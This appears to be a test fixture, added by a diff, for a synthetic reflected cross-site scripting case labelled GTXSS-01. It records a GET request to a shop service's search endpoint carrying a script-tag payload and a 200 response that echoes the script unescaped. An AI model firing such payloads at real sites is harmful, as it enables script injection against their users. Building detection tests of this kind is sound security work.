@@ -1,0 +1,6 @@
+GET /search?q=<script>alert(1)</script> HTTP/1.1
+Host: svc-shop:8001
+
+=> status 200
+
+<html>search results <script>alert(1)</script> GTXSS-01 synthetic reflected xss</html>
